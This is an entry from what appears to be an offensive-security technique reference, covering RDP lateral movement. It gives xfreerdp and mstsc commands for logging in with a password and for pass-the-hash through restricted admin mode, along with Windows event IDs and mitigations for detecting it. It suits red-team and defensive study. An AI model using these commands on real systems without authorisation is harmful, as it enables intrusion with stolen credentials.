---
id: rdp_lateral
type: technique
label: "RDP lateral movement & session hijacking"
phase: "lateral"
tools: []
cve: null
detect: "4624 type 10; tscon.exe invocation."
mitre: "T1021.001 / T1563.002"
tag: null
---


# RDP lateral movement & session hijacking

### Affected object / attribute
**RDP logon** on the target.

### Concept (deep)
RDP with a password, hash (`/pth`), or pass-the-ticket; **restricted admin mode** enables PTH to RDP; NLA determines feasibility.

### Commands
```bash
# ── RDP with password ────────────────────────────────────────────────
xfreerdp /v:10.10.10.6 /u:admin /p:'Password123!' /cert-ignore /dynamic-resolution

# ── RDP with hash (restricted admin) ────────────────────────────────
xfreerdp /v:10.10.10.6 /u:admin /pth:<nt> /cert-ignore

# ── Native restricted admin ─────────────────────────────────────────
mstsc /restrictedAdmin /v:10.10.10.6
```

### Detection
**4624 type 10**; **1149** (RDP auth); source IP baseline; disable Restricted Admin unless required; NLA + MFA.

---
